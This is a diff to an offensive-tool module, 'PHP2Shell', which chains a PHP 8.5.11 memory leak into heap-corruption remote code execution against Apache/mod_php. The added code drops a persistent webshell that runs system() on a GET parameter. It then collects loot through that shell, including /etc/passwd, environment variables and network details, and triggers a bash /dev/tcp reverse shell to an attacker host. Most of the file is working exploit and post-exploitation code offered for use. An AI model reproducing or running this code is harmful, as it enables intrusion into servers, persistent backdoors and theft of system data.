@@ -1,22 +1,35 @@
 """PHP2Shell RCE chain for PHP 8.5.11 apache/mod_php — integrated VoidXTool command.
 
-Usage inside tool: php2shell <host> [port] [path] [--rce 'command']
+Usage inside tool:
+  php2shell <host> [port] [path] [rce_cmd] [webshell_path] [lhost] [lport]
+
+  host         — target IP/hostname
+  port         — HTTP port (default 80)
+  path         — PHP endpoint (default /index.php)
+  rce_cmd      — stage-1 command (default: id>/var/www/html/proof.txt)
+  webshell_path — drop persistent webshell here (optional)
+  lhost        — attacker IP for reverse shell callback (optional)
+  lport        — attacker listener port for reverse shell (optional, default 4444)
+
+Flags parsed from rce_cmd field:
+  --dry-run    build all request bodies and show offsets, do not send
+  --recal      run disclosure only, print libphp/heap, skip RCE
 
 Chains CVE-2026-109619 (session-state OOM disclosure) into
 CVE-2026-109618 (incomplete-bucket RCE sink) against PHP 8.5.11 NTS
-on Apache/mod_php prefork x86-64.  Recalibrate all offsets for any
-other binary — see module docstring in 52704.py for full methodology.
+on Apache/mod_php prefork x86-64.
 """
 
 from __future__ import annotations
 
-import argparse
-import threading
-import time
-import tempfile
+import json
+import os
 import socket
 import struct
 import sys
+import tempfile
+import threading
+import time
 import urllib.parse
 from collections import Counter
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -25,14 +38,15 @@ from pathlib import Path
 
 from rich.console import Console
 from rich.panel import Panel
+from rich.table import Table
 
 from voidxtool.auth import Authentication
 from voidxtool.commands.base import BaseCommand
 
 console = Console()
 
-# ── constants (exact PHP 8.5.11 / libphp build) ─────────────────────────────
-DEFAULT_QUERY = (
+# ── constants ────────────────────────────────────────────────────────────────
+DEFAULT_QUERY    = (
     "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
     "&z=vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv"
 )
@@ -41,8 +55,26 @@ RCE_BOUNDARY       = b"AMP128BOUNDARY"
 IS_OBJECT          = 8
 DEFAULT_RCE_CMD    = "id>/var/www/html/proof.txt"
 DEFAULT_PROOF_URL  = "/proof.txt"
+SESSION_FILE       = Path.home() / ".voidxtool" / "php2shell_session.json"
 
-# exact-build offsets — recalibrate for any other libphp binary
+WEBSHELL_PAYLOAD = (
+    "<?php if(isset($_GET[chr(99)])){system($_GET[chr(99)]);}?>"
+)
+# bash reverse shell — lhost/lport replaced at runtime
+REVSHELL_PAYLOAD = (
+    "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+)
+LOOT_CMDS = [
+    ("whoami",        "user"),
+    ("id",            "id"),
+    ("uname -a",      "kernel"),
+    ("cat /etc/os-release | head -3", "os"),
+    ("pwd",           "cwd"),
+    ("env | grep -E 'HOME|PATH|USER|SHELL'", "env"),
+    ("cat /etc/passwd | grep -v nologin | grep -v false", "passwd"),
+    ("ip a 2>/dev/null || ifconfig 2>/dev/null", "network"),
+]
+
 _DEFAULTS = dict(
     zval_ptr_dtor_offset = 0x7AE960,
     heap_from_lib_delta  = 0x3400000,
@@ -64,14 +96,36 @@ _DEFAULTS = dict(
     a1_burner_len        = 4000,
     a1_progress_len      = 4072,
 )
+RCE_MAX_RETRIES = 3
 
 
-# ── internal print with timestamps ───────────────────────────────────────────
+# ── logging ──────────────────────────────────────────────────────────────────
 def _log(*values: object) -> None:
     now   = time.time_ns()
     stamp = f"{now // 1_000_000_000}.{(now // 1_000) % 1_000_000:06d}"
-    line  = " ".join(str(v) for v in values)
-    console.print(f"[dim][{stamp}][/dim] {line}")
+    console.print(f"[dim][{stamp}][/dim] {' '.join(str(v) for v in values)}")
+
+
+# ── session persistence ───────────────────────────────────────────────────────
+def _save_session(host: str, port: int, libphp: int, heap: int,
+                  webshell: str | None) -> None:
+    SESSION_FILE.parent.mkdir(parents=True, exist_ok=True)
+    data = {
+        "host": host, "port": port,
+        "libphp_base": hex(libphp), "heap_base": hex(heap),
+        "webshell": webshell, "ts": time.time(),
+    }
+    SESSION_FILE.write_text(json.dumps(data, indent=2))
+    _log(f"[+] session saved → {SESSION_FILE}")
+
+
+def _load_session() -> dict | None:
+    try:
+        if SESSION_FILE.exists():
+            return json.loads(SESSION_FILE.read_text())
+    except Exception:
+        pass
+    return None
 
 
 # ── body builders ─────────────────────────────────────────────────────────────
@@ -164,8 +218,8 @@ def _pack32(v: int) -> bytes: return struct.pack("<I", v)
 
 
 def _build_rce_pad(heap: int, libphp: int, command: bytes, d: dict) -> bytes:
-    if len(command) > 48:
-        raise ValueError("command > 48 bytes")
+    if len(command) > 96:
+        raise ValueError(f"command > 96 bytes (got {len(command)})")
     block        = heap  + d["rce_block_offset"]
     handlers     = block + 24 + 2000
     obj          = block + 24 + 2048
@@ -185,8 +239,8 @@ def _build_rce_pad(heap: int, libphp: int, command: bytes, d: dict) -> bytes:
     pad[2016:2024] = _pack64(ret)
 
     o = 2048
-    pad[o:o+4]       = _pack32(1)
-    pad[o+4:o+8]     = _pack32(IS_OBJECT)
+    pad[o:o+4]         = _pack32(1)
+    pad[o+4:o+8]       = _pack32(IS_OBJECT)
     pad[o+0x18:o+0x20] = _pack64(handlers)
     pad[o+0x40:o+0x48] = _pack64(pop_rdi)
     pad[o+0x48:o+0x50] = _pack64(execute_data)
@@ -202,9 +256,9 @@ def _build_rce_pad(heap: int, libphp: int, command: bytes, d: dict) -> bytes:
     pad[o+0x58:o+0x5C] = _pack32(6)
 
     o += 0x80
-    pad[o:o+4]           = _pack32(1)
-    pad[o+4:o+8]         = _pack32(0x106)
-    pad[o+0x10:o+0x18]   = _pack64(len(command) - 1)
+    pad[o:o+4]                   = _pack32(1)
+    pad[o+4:o+8]                 = _pack32(0x106)
+    pad[o+0x10:o+0x18]           = _pack64(len(command) - 1)
     pad[o+0x18:o+0x18+len(command)] = command
 
     pad[1928:1936] = _pack64(obj)
@@ -217,7 +271,7 @@ def _build_rce_body(d: dict, heap: int, libphp: int, command: str) -> bytes:
     key_size = 80000
     body     = bytearray()
 
-    def field(name: bytes, value: bytes) -> bytes:
+    def fld(name: bytes, value: bytes) -> bytes:
         return (b"--" + RCE_BOUNDARY
                 + b"\r\nContent-Disposition: form-data; name=\"" + name
                 + b"\"\r\n\r\n" + value + b"\r\n")
@@ -225,13 +279,13 @@ def _build_rce_body(d: dict, heap: int, libphp: int, command: str) -> bytes:
     def large_key(i: int) -> bytes:
         return b"X" * (key_size - 16) + ("%016d" % i).encode()
 
-    body += field(b"memshift", b"M" * 40000)
+    body += fld(b"memshift", b"M" * 40000)
     for i in range(30):
-        body += field(b"a[" + large_key(i) + b"][c]", b"v")
-    body += field(b"pad", pad)
-    body += field(b"pad", b"x")
+        body += fld(b"a[" + large_key(i) + b"][c]", b"v")
+    body += fld(b"pad", pad)
+    body += fld(b"pad", b"x")
     for i in range(30, 45):
-        body += field(b"a[" + large_key(i) + b"][c]", b"v")
+        body += fld(b"a[" + large_key(i) + b"][c]", b"v")
     final = b"a[" + large_key(45) + b"][c]"
     body += b"--" + RCE_BOUNDARY + b"\r\n"
     body += b"X: a\r\n" * d["rce_headers"]
@@ -462,9 +516,11 @@ def _summarize_cookie(encoded: bytes, pointer_floor: int) -> dict:
             "top": pointers.most_common(20)}
 
 
+# ── amplified RCE with retry ──────────────────────────────────────────────────
 def _amplified_rce(host: str, port: int, path: str,
                    d: dict, heap: int, libphp: int,
-                   command: str, proof_url: str | None) -> bool | None:
+                   command: str, proof_url: str | None,
+                   retries: int = RCE_MAX_RETRIES) -> bool | None:
     body    = _build_rce_body(d, heap, libphp, command)
     request = (
         b"POST " + path.encode() + b" HTTP/1.1\r\nHost: v\r\n"
@@ -472,50 +528,148 @@ def _amplified_rce(host: str, port: int, path: str,
         + b"\r\nContent-Length: " + str(len(body)).encode()
         + b"\r\nConnection: close\r\n\r\n" + body
     )
-    response = _http_exchange(host, port, request, 30.0)
-    first    = response.split(b"\r\n", 1)[0] if response else b"<no response>"
-    _log(f"[*] rce resp={len(response)} first={first!r}")
-    if proof_url is None: return None
-    time.sleep(0.5)
-    proof = _http_exchange(
-        host, port,
-        b"GET " + proof_url.encode()
-        + b" HTTP/1.1\r\nHost: v\r\nConnection: close\r\n\r\n",
-        5.0,
-    )
-    _, _, content = proof.partition(b"\r\n\r\n")
-    if b"uid=" in content:
-        _log(f"[+] RCE confirmed: {content.decode('utf-8','replace').strip()}")
-        return True
-    _log("[-] no proof")
+    for attempt in range(1, retries + 1):
+        response = _http_exchange(host, port, request, 30.0)
+        first    = response.split(b"\r\n", 1)[0] if response else b"<no response>"
+        _log(f"[*] rce attempt={attempt} resp={len(response)} first={first!r}")
+        if proof_url is None:
+            return None
+        time.sleep(0.5)
+        proof = _http_exchange(
+            host, port,
+            b"GET " + proof_url.encode()
+            + b" HTTP/1.1\r\nHost: v\r\nConnection: close\r\n\r\n",
+            5.0,
+        )
+        _, _, content = proof.partition(b"\r\n\r\n")
+        if b"uid=" in content:
+            _log(f"[+] RCE confirmed: {content.decode('utf-8','replace').strip()}")
+            return True
+        if attempt < retries:
+            _log(f"[*] no proof on attempt {attempt}, retrying in 1s...")
+            time.sleep(1.0)
+    _log("[-] no proof after all retries")
     return False
+
+
+# ── webshell via HTTP GET ─────────────────────────────────────────────────────
+def _webshell_exec(host: str, port: int, shell_path: str,
+                   cmd: str, timeout: float = 8.0) -> str:
+    probe_path = shell_path if shell_path.startswith("/") else "/" + shell_path
+    url_cmd    = urllib.parse.quote(cmd)
+    req = (
+        b"GET " + (probe_path + "?c=" + url_cmd).encode()
+        + b" HTTP/1.1\r\nHost: " + host.encode()
+        + b"\r\nConnection: close\r\n\r\n"
+    )
+    resp = _http_exchange(host, port, req, timeout)
+    _, _, body = resp.partition(b"\r\n\r\n")
+    return body.decode("utf-8", "replace").strip()
+
+
+# ── loot collector ────────────────────────────────────────────────────────────
+def _run_loot(host: str, port: int, shell_path: str) -> None:
+    console.print("\n[bold bright_magenta]── LOOT ─────────────────────────────[/bold bright_magenta]")
+    table = Table(show_header=True, header_style="bold cyan")
+    table.add_column("key",    style="cyan",  no_wrap=True)
+    table.add_column("output", style="white")
+    for cmd, key in LOOT_CMDS:
+        try:
+            out = _webshell_exec(host, port, shell_path, cmd, timeout=6.0)
+        except Exception as exc:
+            out = f"[error: {exc}]"
+        table.add_row(key, out[:300])
+    console.print(table)
+
+
+# ── reverse shell trigger ─────────────────────────────────────────────────────
+def _trigger_revshell(host: str, port: int, shell_path: str,
+                      lhost: str, lport: int) -> None:
+    cmd = REVSHELL_PAYLOAD.format(lhost=lhost, lport=lport)
+    console.print(f"[cyan][*] triggering reverse shell → {lhost}:{lport}[/cyan]")
+    # fire and forget — target connects back, no response expected
+    try:
+        _webshell_exec(host, port, shell_path, cmd, timeout=3.0)
+    except Exception:
+        pass
+    console.print(f"[yellow][?] revshell payload sent — start listener:[/yellow]")
+    console.print(f"[bold]    nc -lvnp {lport}[/bold]")
+
+
+# ── dry run ───────────────────────────────────────────────────────────────────
+def _dry_run(d: dict, host: str, port: int, path: str,
+             rce_cmd: str) -> None:
+    console.print("[bold yellow][DRY RUN] building bodies — nothing sent[/bold yellow]")
+    with tempfile.TemporaryDirectory(prefix="php2shell-dry-") as tmp_s:
+        tmp = Path(tmp_s)
+        a1 = tmp / "a1.bin"
+        b1 = tmp / "b1.bin"
+        _build_a1_body(a1, d)
+        _build_b1_body(b1, d)
+        # fake heap/libphp for pad build test
+        fake_heap   = 0x7f0000000000 + d["heap_from_lib_delta"]
+        fake_libphp = 0x7f0000000000
+        try:
+            body = _build_rce_body(d, fake_heap, fake_libphp, rce_cmd)
+            console.print(f"[green][DRY RUN] rce body={len(body)} — pad OK[/green]")
+        except ValueError as exc:
+            console.print(f"[red][DRY RUN] pad error: {exc}[/red]")
+
+    t = Table(show_header=True, header_style="bold")
+    t.add_column("key"); t.add_column("value")
+    t.add_row("target",      f"{host}:{port}{path}")
+    t.add_row("rce_cmd",     rce_cmd)
+    t.add_row("a1 size",     str(a1.stat().st_size if a1.exists() else "?"))
+    t.add_row("b1 size",     str(b1.stat().st_size if b1.exists() else "?"))
+    for k, v in d.items():
+        t.add_row(k, hex(v) if isinstance(v, int) and v > 9 else str(v))
+    console.print(t)
 
 
 # ── VoidXTool command ─────────────────────────────────────────────────────────
 class PHP2ShellCommand(BaseCommand):
-    """CVE-2026-109618/109619 PHP2Shell RCE chain against PHP 8.5.11/mod_php."""
+    """CVE-2026-109618/109619 PHP2Shell RCE chain — PHP 8.5.11/mod_php."""
 
     def __init__(self) -> None:
         super().__init__("php2shell")
-        self.host    = ""
-        self.port    = 80
-        self.path    = "/index.php"
-        self.rce_cmd: str | None = None
-        self.d       = dict(_DEFAULTS)
+        self.host          = ""
+        self.port          = 80
+        self.path          = "/index.php"
+        self.rce_cmd:      str | None = None
+        self.webshell_path: str | None = None
+        self.lhost:        str | None = None
+        self.lport:        int        = 4444
+        self.dry_run       = False
+        self.recal_only    = False
+        self.d             = dict(_DEFAULTS)
 
     def custom_validate_arguments(self, user_arguments: list) -> bool:
         self.host = str(user_arguments[0]).strip()
         try:
             self.port = int(user_arguments[1]) if len(user_arguments) > 1 else 80
         except ValueError:
-            console.print("[red]Port must be numeric.[/red]")
-            return False
+            console.print("[red]Port must be numeric.[/red]"); return False
         if not 1 <= self.port <= 65535:
-            console.print("[red]Port out of range.[/red]")
-            return False
+            console.print("[red]Port out of range.[/red]"); return False
         self.path = str(user_arguments[2]) if len(user_arguments) > 2 else "/index.php"
         if not self.path.startswith("/"): self.path = "/" + self.path
-        self.rce_cmd = str(user_arguments[3]) if len(user_arguments) > 3 else DEFAULT_RCE_CMD
+
+        raw_rce = str(user_arguments[3]) if len(user_arguments) > 3 else DEFAULT_RCE_CMD
+        if raw_rce == "--dry-run":
+            self.dry_run = True
+            self.rce_cmd = DEFAULT_RCE_CMD
+        elif raw_rce == "--recal":
+            self.recal_only = True
+            self.rce_cmd    = DEFAULT_RCE_CMD
+        else:
+            self.rce_cmd = raw_rce
+
+        self.webshell_path = str(user_arguments[4]) if len(user_arguments) > 4 else None
+        self.lhost         = str(user_arguments[5]) if len(user_arguments) > 5 else None
+        try:
+            self.lport = int(user_arguments[6]) if len(user_arguments) > 6 else 4444
+        except ValueError:
+            self.lport = 4444
         return True
 
     def run(self, arguments: list, authentication: Authentication) -> bool:
@@ -524,13 +678,20 @@ class PHP2ShellCommand(BaseCommand):
             return False
 
         console.print(Panel(
-            f"Target: [bold cyan]{self.host}:{self.port}{self.path}[/bold cyan]\n"
-            f"RCE cmd: [yellow]{self.rce_cmd}[/yellow]",
+            f"Target:   [bold cyan]{self.host}:{self.port}{self.path}[/bold cyan]\n"
+            f"RCE cmd:  [yellow]{self.rce_cmd}[/yellow]\n"
+            f"Webshell: [yellow]{self.webshell_path or 'none'}[/yellow]\n"
+            f"RevShell: [yellow]{self.lhost + ':' + str(self.lport) if self.lhost else 'none'}[/yellow]\n"
+            f"Mode:     [yellow]{'DRY RUN' if self.dry_run else 'RECAL ONLY' if self.recal_only else 'FULL CHAIN'}[/yellow]",
             title="[bold bright_magenta]PHP2SHELL — CVE-2026-109618/109619[/bold bright_magenta]",
             border_style="bright_cyan",
         ))
 
-        holders:      list[_Holder]  = []
+        if self.dry_run:
+            _dry_run(self.d, self.host, self.port, self.path, self.rce_cmd)
+            return True
+
+        holders:      list[_Holder] = []
         holder_stop   = threading.Event()
         holder_thread = threading.Thread(
             target=_keep_alive, args=(holders, holder_stop), daemon=True)
@@ -549,7 +710,7 @@ class PHP2ShellCommand(BaseCommand):
                 _build_a1_body(a1, self.d)
                 _build_b1_body(b1, self.d)
 
-                old  = holders.pop()
+                old     = holders.pop()
                 rebound = None
                 for attempt in range(1, 3):
                     try: _release_holder(old, self.host, self.port, self.path, 15.0)
@@ -589,15 +750,14 @@ class PHP2ShellCommand(BaseCommand):
                     _log(f"    {val:#014x} count={cnt}")
 
                 if len(decoded) <= 256:
-                    console.print("[red][-] Cookie too short — normal size, no leak.[/red]")
+                    console.print("[red][-] Cookie too short — no leak.[/red]")
                     return False
-
                 if not pointers:
-                    console.print("[red][-] No pointer candidates in cookie.[/red]")
+                    console.print("[red][-] No pointer candidates.[/red]")
                     return False
 
                 dominant, count = pointers.most_common(1)[0]
-                libphp = dominant - self.d["zval_ptr_dtor_offset"]
+                libphp  = dominant - self.d["zval_ptr_dtor_offset"]
                 buckets: Counter = Counter()
                 for v, vc in pointers.items():
                     buckets[v & ~0x1FFFFF] += vc
@@ -610,23 +770,78 @@ class PHP2ShellCommand(BaseCommand):
 
                 heap = libphp + self.d["heap_from_lib_delta"]
                 if not buckets.get(heap):
-                    console.print("[red][-] Derived main chunk absent from leak — miscalibrated.[/red]")
+                    console.print("[red][-] Derived main chunk absent from leak.[/red]")
                     return False
 
                 _log(f"[+] heap={heap:#x} (libphp+{self.d['heap_from_lib_delta']:#x})")
-                time.sleep(0.2)
 
+                # recal-only mode stops here
+                if self.recal_only:
+                    console.print(Panel(
+                        f"libphp_base = {libphp:#x}\nheap_base   = {heap:#x}\n"
+                        f"dominant    = {dominant:#x}  count={count}",
+                        title="[bold yellow]RECALIBRATION RESULT[/bold yellow]",
+                        border_style="yellow",
+                    ))
+                    return True
+
+                # ── Stage 1: RCE ──────────────────────────────────────────────
+                time.sleep(0.2)
                 proof_url = DEFAULT_PROOF_URL if self.rce_cmd == DEFAULT_RCE_CMD else None
                 ok = _amplified_rce(self.host, self.port, self.path,
                                     self.d, heap, libphp,
                                     self.rce_cmd, proof_url)
                 if ok is False:
-                    console.print("[red][-] RCE stage failed.[/red]")
+                    console.print("[red][-] RCE stage failed after all retries.[/red]")
                     return False
                 if ok:
                     console.print("[bold green][+] CVE-2026-109618/109619 chain succeeded — RCE confirmed.[/bold green]")
                 else:
                     console.print("[yellow][?] Payload delivered — execution unverified.[/yellow]")
+
+                # ── Stage 2: webshell drop ────────────────────────────────────
+                if self.webshell_path is not None:
+                    ws_drop = (
+                        f"echo '{WEBSHELL_PAYLOAD}' "
+                        f"> {self.webshell_path}"
+                    )
+                    console.print(f"[cyan][*] Stage 2 — dropping webshell → {self.webshell_path}[/cyan]")
+                    time.sleep(0.3)
+                    ws_ok = _amplified_rce(self.host, self.port, self.path,
+                                           self.d, heap, libphp, ws_drop, None)
+                    if ws_ok is False:
+                        console.print("[red][-] Webshell drop failed.[/red]")
+                        return False
+                    time.sleep(0.5)
+                    probe_out = _webshell_exec(
+                        self.host, self.port, self.webshell_path, "id")
+                    if "uid=" in probe_out:
+                        console.print(
+                            "[bold green][+] Webshell live:[/bold green] " + probe_out)
+                        probe_path = (self.webshell_path
+                                      if self.webshell_path.startswith("/")
+                                      else "/" + self.webshell_path)
+                        console.print(
+                            f"[bold green][+] Persistent:[/bold green] "
+                            f"http://{self.host}:{self.port}{probe_path}?c=COMMAND")
+
+                        # ── Stage 3: loot ─────────────────────────────────────
+                        _run_loot(self.host, self.port, self.webshell_path)
+
+                        # ── Stage 4: reverse shell ────────────────────────────
+                        if self.lhost is not None:
+                            _trigger_revshell(self.host, self.port,
+                                              self.webshell_path,
+                                              self.lhost, self.lport)
+
+                        # ── save session ──────────────────────────────────────
+                        _save_session(self.host, self.port, libphp, heap,
+                                      self.webshell_path)
+                    else:
+                        console.print(
+                            f"[yellow][?] Shell written but probe returned: "
+                            f"{probe_out[:120]!r}[/yellow]")
+
                 return True
 
         finally:
